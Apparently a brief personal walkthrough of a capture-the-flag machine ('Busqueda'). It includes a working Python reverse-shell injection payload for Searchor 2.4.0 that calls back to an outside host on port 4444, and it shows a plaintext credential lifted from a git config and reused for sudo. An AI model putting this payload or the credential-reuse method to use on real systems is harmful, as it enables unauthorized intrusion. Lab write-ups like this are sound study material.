nmap indicates that port 80 is open

after adding to /etc/hosts file we have this:

![](20230517200314.png)

injection attack maybe?

it says that it uses searchor 2.4.0

https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-


```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.2',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

got a shell

![](20230517205841.png)

https://github.com/carlospolop/PEASS-ng/releases/download/20230514-85dabdc9/linpeas.shhttps://github.com/carlospolop/PEASS-ng/releases/download/20230514-85dabdc9/linpeas.sh

69d74a3bcb733e6212dd32f6857e02d7

$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
$ 

logged into the domain gitea.searcher.htb

![](20230517213922.png)

password reuse is popular: jh1usoih2bkjaspwe92

```
$ sudo -l
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```

$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db


# learning

1. read information specific to the box
2. check your user, user.txt is in the home directory
3. look at git config
4. password reuse



